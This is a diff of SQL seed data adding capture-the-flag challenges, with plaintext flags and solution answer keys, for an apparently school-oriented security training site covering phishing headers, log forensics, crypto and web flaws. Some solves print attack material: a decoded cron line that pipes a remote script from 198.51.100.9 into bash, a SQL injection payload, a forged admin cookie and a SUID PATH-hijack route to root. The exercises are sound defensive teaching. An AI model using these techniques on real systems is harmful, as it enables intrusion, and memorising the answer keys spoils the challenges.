@@ -176,8 +176,133 @@ The password is in ~/lab/wordlist.txt in the Linux lab. The flag is aayat{PASSWO
 ```
 ', 'CyberChef: URL Decode. Then read what the attacker tried to select.', 'cyberchef/index.html#input=MjAzLjAuMTEzLjcgLSAtIFswMy9Ob3YvMjAyNjowOTowODo0NCArMDAwMF0gIkdFVCAvc2hvcD9pZD0xMiUyMFVOSU9OJTIwU0VMRUNUJTIwJTI3YWF5YXQlN0J1cmwlNUZkZWNvZGUlNUZ0aGUlNUZhdHRhY2slN0QlMjclMkMxJTIwRlJPTSUyMHVzZXJzJTJEJTJEIEhUVFAvMS4xIiAyMDAgMzMwMSAiLSIgInNxbG1hcC8xLjgi', 'db02ff1749cb5198d69811736b638e6f97c924852b630c02af0fa36cf267e113', 'aayat{url_decode_the_attack}', 'URL Decode shows UNION SELECT ''aayat{url_decode_the_attack}'',1 FROM users--', 60, true, true),
 ('app-cloud-user', 5, 100, 'The backdoor account', 'In the Paperplane cloud key runbook, what is the name of the user the attacker created? The flag is aayat{USERNAME}.
-', 'Look for CreateUser in audit.json.', 'notebook.html#nb-cases-h', '834c4814c35d5caa3e0401e5027af0022676eb3a11aac1bdaf108f4e78bfff07', 'aayat{support-backup}', 'grep CreateUser -A2 audit.json', 62, true, true)
+', 'Look for CreateUser in audit.json.', 'notebook.html#nb-cases-h', '834c4814c35d5caa3e0401e5027af0022676eb3a11aac1bdaf108f4e78bfff07', 'aayat{support-backup}', 'grep CreateUser -A2 audit.json', 62, true, true),
+('f-phish-eml', 1, 200, 'The invoice email', 'The finance office forwarded a suspicious email as a raw .eml file. The From line says Dropbox. Prove it isn''t.
+
+Open invoice.eml in a text editor (not a mail app). Find the domain that really sent it, and the IP address of the first mail server outside the school that handed it over.
+
+Flag: aayat{domain_ip}, for example aayat{bad.example_192.0.2.1}
+
+Files: assets/ctf-files/f-phish-eml/invoice.eml', 'Received headers are added top-down by each server, so read them bottom-up. The school''s own servers are 10.x addresses with kestrel-school in the name. DKIM d= and SPF smtp.mailfrom name the real sender.', 'cyberchef/index.html', 'a4afab9f95f41f2aa054d776a0841afac1772888fd5d76d9693fa665314557bc', 'aayat{dr0pbox-files.example_198.51.100.73}', 'DKIM d=dr0pbox-files.example passes and SPF passes for mailer.dr0pbox-files.example, while DMARC fails for dropbox.com: the real sender is dr0pbox-files.example. The Received line added by mx1.kestrel-school.example says it came from smtp-out.dr0pbox-files.example (198.51.100.73); the line below that is inside the sender''s network. The base64 bodies decode to a link to www.dropbox.com.view.dr0pbox-files.example.', 100, true, true),
+('f-pw-entropy', 1, 100, 'How many bits?', 'Read policy.txt. For each policy, work out the entropy in bits of a randomly chosen password: bits = length x log2(number of choices per position).
+
+Round each to the nearest whole number. Flag: aayat{A_B_C}, for example aayat{10_20_30}
+
+Files: assets/ctf-files/f-pw-entropy/policy.txt', 'log2(7776) is about 12.92, log2(26) about 4.70, log2(94) about 6.55. Python: import math; 4*math.log2(7776)', '', '59e799b4eba4312b1ac85259ce653a9f7fbb63b54ddbf1a6ac4c3b97fef641cb', 'aayat{52_38_66}', 'A = 4 x log2(7776) = 51.7; B = 8 x log2(26) = 37.6; C = 10 x log2(94) = 65.5. The passphrase beats the 8-letter password by about 14 bits (16,000 times more guesses).', 101, true, true),
+('f-acrostic', 1, 100, 'A memo with a margin', 'An insider is suspected of leaking a message inside a harmless-looking staff memo. Nothing in the words looks secret. Download memo.txt and look at it a different way.
+
+The hidden message is one word. Flag: aayat{word}
+
+Files: assets/ctf-files/f-acrostic/memo.txt', 'Hiding a message in the first letter of each line has a name: an acrostic.', '', '0052f2a3591b30a028cb45f9b09e392b38905984ebe4ad65828cf04ecfff3586', 'aayat{readthemargin}', 'Read the first letter of each body line: R-E-A-D-T-H-E-M-A-R-G-I-N.', 102, true, true),
+('f-zero-width', 1, 200, 'Nothing to see here', 'notice.txt looks like a two-line note from a teacher, but the file is far bigger than two lines of text should be. Something invisible is inside.
+
+Find it and decode it. The result is the flag.
+
+Files: assets/ctf-files/f-zero-width/notice.txt', 'Some Unicode characters have zero width. CyberChef''s Escape Unicode Characters shows them as \u200B and \u200C. Two different symbols means binary.', 'cyberchef/index.html', '30734d2da3376dee24c43ac24ac3f4d2c5fab0cb89064acd5a8dec7eb08c505f', 'aayat{invisible_ink_is_still_ink}', 'After ''Hi team,'' (and a U+200D marker) are 264 zero-width characters: U+200B = 0, U+200C = 1. In CyberChef: Escape Unicode Characters, keep only the \u200b/\u200c run, Find/Replace \u200b->0 and \u200c->1, then From Binary.', 103, true, true),
+('f-door-forced', 2, 200, 'The door that opened itself', 'The server room door controller logs every badge swipe (SWIPE_OK / SWIPE_DENIED), every press of the exit button inside (REX), and every time the door physically opens or closes.
+
+A door should only open right after SWIPE_OK or REX at the same door. One evening, one door opened with neither. Download door_events.csv and find when.
+
+Flag: aayat{HH:MM:SS} of the unexplained DOOR_OPEN.
+
+Files: assets/ctf-files/f-door-forced/door_events.csv', 'Filter to DOOR_OPEN rows, then check the row just before each one at the same door. A spreadsheet filter or a short Python loop both work.', '', '16f0ad296f8274f7b5e3776cb3ff855319feb0a2cfa0c77c9c95ee61006a56f6', 'aayat{22:14:31}', 'At 22:14:05 and 22:14:12 badge B-5520 is denied at the Server room. At 22:14:31 the door opens with no swipe or REX, then it is held open (DOOR_HELD). Someone forced or propped it after being refused.', 104, true, true),
+('f-timeline', 2, 300, 'Put it in order', 'Payroll data leaked on 3 November. Five systems each saw part of it, but every log keeps time differently: UTC, India time (UTC+05:30), US Eastern (UTC-05:00) and Unix epoch seconds.
+
+Find these five events in the files:
+A. Badge B-2093 (rkapoor''s) leaves through the lobby
+B. A VPN login as rkapoor from outside
+C. rkapoor''s account reads payroll_2026.xlsx
+D. rkapoor''s password is reset through the helpdesk chat
+E. A USB storage stick is mounted on WS-14
+
+Convert every time to UTC and put the events in order, earliest first. Flag: aayat{five letters}, for example aayat{abcde}
+
+Files: assets/ctf-files/f-timeline/badge_IST.csv assets/ctf-files/f-timeline/vpn_UTC.log assets/ctf-files/f-timeline/fileserver_EST.log assets/ctf-files/f-timeline/directory_events.json assets/ctf-files/f-timeline/ws14_IST.log', 'Subtract 5:30 from India times; add 5 hours to Eastern times (and mind AM/PM); an epoch converter (or CyberChef From UNIX Timestamp) gives UTC directly.', '', '5cd238d4cbe2fd6bd81b7180c665fab4bd5783eac077dbd3b6ab5bc3c186bb81', 'aayat{bdaec}', 'UTC: B 15:58:12, D 16:02:40, A 16:10:05, E 16:21:33, C 16:47:19. Someone was on the VPN as rkapoor before the helpdesk reset the password, rkapoor then left the building, a USB stick went into WS-14, and the payroll read came last, with rkapoor no longer on site.', 105, true, true),
+('f-acl', 2, 100, 'Who should not have got in?', 'The school file server should follow least privilege: each role may use only its own folders (roles.txt), and every user has one role (users.tsv).
+
+The server''s access.log shows one request that was ALLOWED even though the user''s role should not reach that folder. A misconfigured permission let them in.
+
+Flag: aayat{username}
+
+Files: assets/ctf-files/f-acl/roles.txt assets/ctf-files/f-acl/users.tsv assets/ctf-files/f-acl/access.log', 'DENY lines are the system working. Look only at ALLOW lines and check each path against that user''s role.', '', 'ed1c05833bfca9d166df8c15b7ceb33555a5f2cea13b60fd9ee8ec928d0e763e', 'aayat{jrao}', 'jrao is a student (only /shared and /homework) but has an ALLOW for WRITE on /grades at 13:07:44.', 106, true, true),
+('f-http-capture', 3, 100, 'Login over plain HTTP', 'A teacher logged into the grades portal from the cafe''s open Wi-Fi. Someone else on the network ran tcpdump. Download capture.txt and find what they saw.
+
+The teacher''s password is the flag.
+
+Files: assets/ctf-files/f-http-capture/capture.txt', 'Port 443 is encrypted (TLS), so it looks like noise. Port 80 is plain HTTP. Look for a POST, then URL-decode %7B and %7D.', 'cyberchef/index.html', 'd4b1587cc6bd418ad1bbd6e3886164ab3b4f6ec49dd2d43db27110489db11ecc', 'aayat{cleartext_travels_naked}', 'The POST to 203.0.113.40:80 carries username=dmehta&password=aayat%7Bcleartext_travels_naked%7D; URL Decode gives the flag.', 107, true, true),
+('f-firewall', 3, 200, 'First match wins', 'rules.txt is the firewall in front of the school servers. packets.txt lists nine connection attempts. Work out which packets get through.
+
+Flag: the allowed packet numbers in ascending order joined by dashes, for example aayat{1-2-9}
+
+Files: assets/ctf-files/f-firewall/rules.txt assets/ctf-files/f-firewall/packets.txt', 'Rule order matters: stop at the first rule that matches protocol, source, destination and port. 10.0.8.0/25 covers .0 to .127 only; 10.0.0.0/16 is 10.0.x.x; 10.0.0.0/8 is any 10.x.x.x.', '', 'cd0e3969ac8d955e094ec1959e6376787e6c4e7b12361080ffbf241c23e30341', 'aayat{2-3-4-6}', 'Allowed: 2, 3, 4, 6. Packet 1 (10.0.8.130) misses rule 1 (/25 ends at .127) and hits rule 2 DENY; packet 3 matches rule 3 before rule 5 can deny 203.0.113.0/24; packet 5 is denied by rule 5 before rule 6; packet 8 (10.1.0.4) is outside 10.0.0.0/16; packet 9 is not 10.x and port 3306 is outside 3000-3999.', 108, true, true),
+('f-dns-exfil', 3, 300, 'Data in the DNS', 'The firewall blocks uploads, but every machine may still ask the DNS server for names. At 2 a.m., one workstation started asking for very strange names. Download dns.log, reassemble what it smuggled out, and decode it.
+
+Files: assets/ctf-files/f-dns-exfil/dns.log', 'Filter for the odd domain. Each name starts with a sequence number; the queries did not arrive in order. Sort by the number, join the hex parts, then From Hex.', 'cyberchef/index.html', '11cc35cdb2455ffb20ba0b92bb7f9fd5125e982f719ab3b44ed20fd07c576ddb', 'aayat{dns_is_a_sneaky_tunnel}', '10.0.4.27 sends TXT queries NN-<10 hex chars>.cdn-sync.example. grep cdn-sync dns.log, sort by NN, join the hex: 61617961747b646e735f69735f615f736e65616b795f74756e6e656c7d -> From Hex -> the flag.', 109, true, true),
+('f-arp-spoof', 3, 200, 'Who is pretending to be the router?', 'Library PCs feel slow and a student says the grades site showed a certificate warning. The router is 10.0.0.1. Download the three files: arp -a from a library PC, the switch''s arpwatch log, and the DHCP server''s lease log.
+
+Someone is poisoning ARP caches so the PCs send router traffic to them. Find the attacker''s own IP address. Flag: aayat{ip}
+
+Files: assets/ctf-files/f-arp-spoof/dhcp.log assets/ctf-files/f-arp-spoof/arp_a.txt assets/ctf-files/f-arp-spoof/arpwatch.log', 'Find the MAC address the PC now thinks belongs to 10.0.0.1. Then find which device the DHCP server gave that exact MAC to. Watch out for a MAC that differs in only the last digit.', '', '03f8c06c77be2cafaa38ec06db0ba45d8b19ec700beb5e4695fc7cf87e2335c7', 'aayat{10.0.0.66}', 'arp -a shows 10.0.0.1 at 5c:e9:1e:77:a0:3f, and arpwatch reports flip flops between the real router 00:1a:2b:3c:4d:01 and 5c:e9:1e:77:a0:3f. dhcp.log leased 10.0.0.66 to 5c:e9:1e:77:a0:3f (android-7d1e). 10.0.0.67''s MAC ends a0:40, not a0:3f.', 110, true, true),
+('f-auth-brute', 4, 100, 'Brute force, then a break-in', 'web01''s /var/log/auth.log from 2 November. Someone hammered SSH with password guesses, and one guess worked. Download auth.log and answer two questions: which IP ran the attack, and which account did it get into?
+
+Flag: aayat{ip_username}
+
+Files: assets/ctf-files/f-auth-brute/auth.log', 'Count Failed password lines per source IP (grep "Failed password" auth.log | awk ''{print $(NF-3)}'' | sort | uniq -c). Then look for an Accepted line from the same IP.', 'linux.html', 'ce555baf6b0facecb9bb56aee614bd0f1f224c13ee347bcf92ea251313e6809b', 'aayat{203.0.113.45_backup}', '203.0.113.45 has 180 failures across many usernames, then ''Accepted password for backup from 203.0.113.45''. tlee''s five fails from 10.0.2.31 are a person mistyping; 198.51.100.200 tried only 9 times and never got in.', 111, true, true),
+('f-cron', 4, 100, 'Every ten minutes', 'web01 keeps reconnecting to an unknown server even after a reboot. An investigator dumped every scheduled task on the box into crontabs.txt. One of them is persistence: the attacker''s way back in.
+
+Find it, decode what it really runs, and the flag is inside.
+
+Files: assets/ctf-files/f-cron/crontabs.txt', 'A web server account (www-data) has no business running scheduled jobs. echo ... | base64 -d | sh hides the real command.', 'cyberchef/index.html', 'b090af3da4723f245b7d0bf5b26b5bed1b337f8a0be758cb11a2e9e0aca520df', 'aayat{cron_never_forgets}', 'www-data runs */10 * * * * echo <base64> | base64 -d | sh. Decoding gives: curl -fsS ''http://198.51.100.9:8443/k.sh?id=web01&tag=aayat{cron_never_forgets}'' | bash >/dev/null 2>&1', 112, true, true),
+('f-suid', 4, 200, 'One SUID too many', 'A SUID program runs as its owner (here, root) no matter who starts it. During a review of a shared Linux server you ran find for SUID files, then strings on the one that looked out of place. Download suid.txt.
+
+Which program is the risk, and which command does it call without a full path (which a user could hijack through PATH)?
+
+Flag: aayat{program_command}, for example aayat{ping_ls}
+
+Files: assets/ctf-files/f-suid/suid.txt', 'Most of the list is standard on every Linux box. Look for one in an unusual folder, then read its strings: system() with a bare command name.', 'linux.html', 'cd6cabcd33a7e1e44bfafa261dcdb607b3e8ff4bdbda96c9641c5757e6cbb1bb', 'aayat{sysbackup_tar}', '/opt/tools/sysbackup is SUID root and not a standard tool. strings shows system() and ''tar czf ...'' with no /usr/bin/ path, so a user can put their own tar first in PATH and get a root shell. Fix: remove SUID or use absolute paths and drop privileges.', 113, true, true),
+('f-hash-id', 4, 200, 'Name the hash, then crack it', 'A config backup leaked three service-account password hashes (hashes.txt). Each uses a different unsalted algorithm. Identify each algorithm by its length, then crack all three with wordlist.txt.
+
+Flag: aayat{print_backup_admin}, the three passwords in that order joined by underscores.
+
+Files: assets/ctf-files/f-hash-id/wordlist.txt assets/ctf-files/f-hash-id/hashes.txt', '32 hex characters = 128 bits (MD5), 40 = 160 bits (SHA-1), 64 = 256 bits (SHA-256). Hash every word and compare; in Python: hashlib.md5(w.encode()).hexdigest()', 'linux.html', 'a3cd874119acf69e8df1fd1fdb4fa71fd40039c5fae182db7f56dc548f5f7442', 'aayat{biryani_kestrel_lighthouse}', 'MD5 76d788a2600b609bb0a08443e03df95b = biryani; SHA-1 9d65c9c5a1edcfbe9f2f916eba32c3255d29c75a = kestrel; SHA-256 b370de14e94142d4a108a79df6d0e265a0ba3fa2e10f57c4b3a892b74c9f84aa = lighthouse. Example: for w in $(cat wordlist.txt); do echo -n $w | sha1sum | grep -q <hash> && echo $w; done', 114, true, true),
+('f-vigenere-story', 5, 200, 'The river key', 'A courier''s notebook page was photographed and typed up as field_notes.txt. The message at the bottom is a Vigenere cipher, and the key is hidden in the story.
+
+Recover the key, decrypt the message, and submit it.
+
+Files: assets/ctf-files/f-vigenere-story/field_notes.txt', 'The key is a single word: the name of a river in the notes. CyberChef has Vigenere Decode; it leaves { } and _ alone.', 'cyberchef/index.html', 'b5d252c3798a00f7f2ed8fea72cc5d0650f31d71029ed16b79b6f1add91ba075', 'aayat{the_river_remembers}', 'Key NARMADA. napmt{whr_rzheu_rrmvybhrf} -> Vigenere Decode (key narmada) -> aayat{the_river_remembers}.', 115, true, true),
+('f-xor-repeat', 5, 300, 'Known plaintext', 'We intercepted intercept.hex from a gang that encrypts with repeating-key XOR: a short key, repeated over the whole message. The key is not a single byte, so brute force over 256 keys will not work.
+
+But we know every message they send starts with aayat{ . Use that to recover the key, then decrypt.
+
+Files: assets/ctf-files/f-xor-repeat/intercept.hex', 'XOR is its own inverse: ciphertext XOR plaintext = key. XOR the first bytes with the text aayat{ and look for a pattern that repeats. CyberChef: From Hex, then XOR with key type UTF8.', 'cyberchef/index.html', '57193370a2a03fe852ca3e2105813b8df06d43b701b316e3847c3afc7590a460', 'aayat{known_plaintext_breaks_repeating_xor}', 'First 6 bytes XOR ''aayat{'' = K3y!K3, so the key is K3y! (4 bytes). From Hex + XOR (UTF8 key K3y!) gives: aayat{known_plaintext_breaks_repeating_xor} -- next drop is Thursday, same place.', 116, true, true),
+('f-cookie', 5, 100, 'Trusting the cookie', 'request.txt is what your browser sends to the school portal; server_code.txt is the excerpt of the portal''s Node.js code that guards /admin. The server trusts a value that you control.
+
+What exact role cookie value would get you into /admin? Flag: aayat{cookie value}
+
+Files: assets/ctf-files/f-cookie/request.txt assets/ctf-files/f-cookie/server_code.txt', 'c3R1ZGVudA== is not random. Decode it, change it, encode it the same way.', 'cyberchef/index.html', '583ec0fef749e01442d1f70240392163a1fb1ec6005daca8d4a3ef4f0fb73221', 'aayat{YWRtaW4=}', 'role=c3R1ZGVudA== is base64 for ''student''. The server only base64-decodes and compares, with no signature, so base64(''admin'') = YWRtaW4= works. The fix is server-side sessions or a signed token.', 117, true, true),
+('f-card-regex', 5, 200, 'Card numbers in the dump', 'A support team''s notes leaked (support_dump.txt). Many lines contain long numbers: order IDs, tracking numbers, payment references. Exactly one is a real, valid card number, which means the company stored card data where it should not (a PCI DSS problem).
+
+Use a regular expression to find every card-like number (16 digits, possibly in groups of 4 separated by spaces or dashes), then check each with the Luhn algorithm. Flag: aayat{last four digits of the valid card}
+
+Files: assets/ctf-files/f-card-regex/support_dump.txt', 'Regex: \b(?:\d{4}[ -]?){3}\d{4}\b. Strip spaces and dashes, then run Luhn: double every second digit from the right, subtract 9 if over 9, sum; valid if the sum ends in 0. CyberChef has a Luhn Checksum operation.', 'cyberchef/index.html', 'a3d2a26a3e27a60b625e266a198080a288eb482d274609175772dcba4261c8e5', 'aayat{8991}', 'Only 4547156775178991 passes Luhn; every other 16-digit run (order IDs, tracking numbers, other payment refs) fails it. Python: re.findall the pattern, strip separators, keep the ones where luhn() is true.', 118, true, true),
+('f-chain', 5, 200, 'Five layers', 'Malware hid its config string under five layers of encoding (blob.txt). Each layer''s output is the next layer''s input. Peel them one by one: after each step ask what the result looks like.
+
+The last layer gives the flag.
+
+Files: assets/ctf-files/f-chain/blob.txt', 'Only A-Z and 2-7 with = padding is Base32. Only 0-9a-f is hex. A Base64 string with the = at the front has been reversed. If the result looks like nnlng{...}, it''s ROT13.', 'cyberchef/index.html', '0c1cfe3929b3dfda4d4206ead71c2a61eb8c81e812ce44e02af61e9ac82988e3', 'aayat{peel_every_layer}', 'From Base32 -> From Hex -> Reverse -> From Base64 -> ROT13.', 119, true, true),
+('rb-first', 1, 100, 'Your first investigation', 'Work the Maple Grove Wi-Fi tutorial runbook. The attacker replaced the Wi-Fi banner with text that looks like nonsense. Decode it.
+', 'Step 11: curl the banner, then pipe it to base64 -d.', 'notebook.html#nb-cases-h', '04171226c016222496078259f7f6cf083f5120ae14d0ddc09b655a5c6f3a8279', 'aayat{one_command_at_a_time}', 'curl -s http://wifi.maplegrove.lan/banner.txt | base64 -d', 50, true, true),
+('rb-miner', 5, 200, 'The miner in the build server', 'Work the Brightloom build server runbook. The attacker left three ways back in. One of them carries a comment.
+', 'Step 7: read every file in persist/, especially root_authorized_keys.', 'notebook.html#nb-cases-h', 'b348230214cdb64c85db099523f09ca23fb2657afd5d3e004e8d500ea60cc16a', 'aayat{three_ways_back_in}', 'The comment on the second key in persist/root_authorized_keys (also served at http://198.51.100.23/k.pub).', 50, true, true),
+('rb-quietdns', 4, 250, 'Quiet DNS', 'Work the Harbourline DNS runbook. A file left the building inside DNS query names. Rebuild it and read its doc-id.
+', 'Step 7: collect the numbered base32 chunks under k7q2.t.cloudmetric.example, drop duplicates, sort, join and base32-decode.', 'notebook.html#nb-cases-h', 'de7afbd38a37e3d143a1a73b738141dae1092a0a8db0c7d3fb3c4bb02f91c486', 'aayat{dns_is_not_just_names}', 'Run the step 7 Python cell; the second line of board_pay_review_2027.csv is the doc-id.', 50, true, true),
+('rb-tc-grades', 2, 100, 'Who changed the grades?', 'Grades changed under a teacher''s name, in subjects he doesn''t teach, from a student lab PC. Use the audit log, sign-in records and lab logins to find out how, and fix the access control. Work the case in a notebook and find the flag.
+', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', 'db6f3c5f332b9c24d4bf78dbbf7c2a46db825f5ef444db1d29f5da734fcecaab', 'aayat{log_out_of_shared_pcs}', 'See the last steps of this case''s runbook.', 60, true, true),
+('rb-tc-library-spray', 2, 100, 'Password spraying at the library portal', 'Nobody was locked out, yet a library member''s account was taken over. Find the slow password spray, the one account it opened and what the attacker changed. Work the case in a notebook and find the flag.
+', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', '240b150d8d76a8234837e1c03d932cc33319c8d38600865680e2a0c7061a72e1', 'aayat{one_password_many_doors}', 'See the last steps of this case''s runbook.', 60, true, true),
+('rb-tc-qr-parking', 1, 100, 'The QR code parking fine', 'Fake parking fines arrive by text and by QR stickers on parking meters. Compare the fake site with the real one and find where the card details go. Work the case in a notebook and find the flag.
+', 'Read each step of the runbook, then look through the evidence it points to.', 'notebook.html#nb-cases-h', 'a903d5bbc5a0f2f5298f2ea74e2f8f2a61e7b816e0d60eff7fde8a77d4b9aa72', 'aayat{scan_then_check_the_link}', 'See the last steps of this case''s runbook.', 60, true, true)
 on conflict (id) do update set unit = excluded.unit, points = excluded.points, title = excluded.title,
   body = excluded.body, hint = excluded.hint, link = excluded.link, flag_hash = excluded.flag_hash,
   flag = excluded.flag, solve = excluded.solve, sort = excluded.sort, builtin = true;
-update ctf_challenges set active = false where builtin and id not in ('cc-base64', 'cc-layers', 'cc-xor', 'cc-vigenere', 'cc-crack', 'cc-jwt', 'net-basic', 'net-scan', 'se-link', 'se-headers', 'phys-badge', 'lx-crack', 'lx-key', 'sqli-login', 'sqli-hidden', 'sqli-union', 'sqli-fix', 'shop-error', 'shop-sqli', 'shop-admin', 'shop-idor', 'shop-backup', 'shop-xss', 'shop-negative', 'shop-feedback', 'shop-reset', 'shop-jwt', 'rb-phish', 'rb-insider', 'rb-web01', 'rb-cloudkey', 'rb-ddos', 'sqli-schema', 'sqli-blind', 'shop-coupon', 'shop-redirect', 'shop-upload', 'se-homoglyph', 'se-shortlink', 'phys-badge-hex', 'phys-insider-usb', 'net-backdoor-port', 'net-dns-before', 'lx-octal', 'lx-md5-wordlist', 'app-urldecode', 'app-cloud-user');
+update ctf_challenges set active = false where builtin and id not in ('cc-base64', 'cc-layers', 'cc-xor', 'cc-vigenere', 'cc-crack', 'cc-jwt', 'net-basic', 'net-scan', 'se-link', 'se-headers', 'phys-badge', 'lx-crack', 'lx-key', 'sqli-login', 'sqli-hidden', 'sqli-union', 'sqli-fix', 'shop-error', 'shop-sqli', 'shop-admin', 'shop-idor', 'shop-backup', 'shop-xss', 'shop-negative', 'shop-feedback', 'shop-reset', 'shop-jwt', 'rb-phish', 'rb-insider', 'rb-web01', 'rb-cloudkey', 'rb-ddos', 'sqli-schema', 'sqli-blind', 'shop-coupon', 'shop-redirect', 'shop-upload', 'se-homoglyph', 'se-shortlink', 'phys-badge-hex', 'phys-insider-usb', 'net-backdoor-port', 'net-dns-before', 'lx-octal', 'lx-md5-wordlist', 'app-urldecode', 'app-cloud-user', 'f-phish-eml', 'f-pw-entropy', 'f-acrostic', 'f-zero-width', 'f-door-forced', 'f-timeline', 'f-acl', 'f-http-capture', 'f-firewall', 'f-dns-exfil', 'f-arp-spoof', 'f-auth-brute', 'f-cron', 'f-suid', 'f-hash-id', 'f-vigenere-story', 'f-xor-repeat', 'f-cookie', 'f-card-regex', 'f-chain', 'rb-first', 'rb-miner', 'rb-quietdns', 'rb-tc-grades', 'rb-tc-library-spray', 'rb-tc-qr-parking');
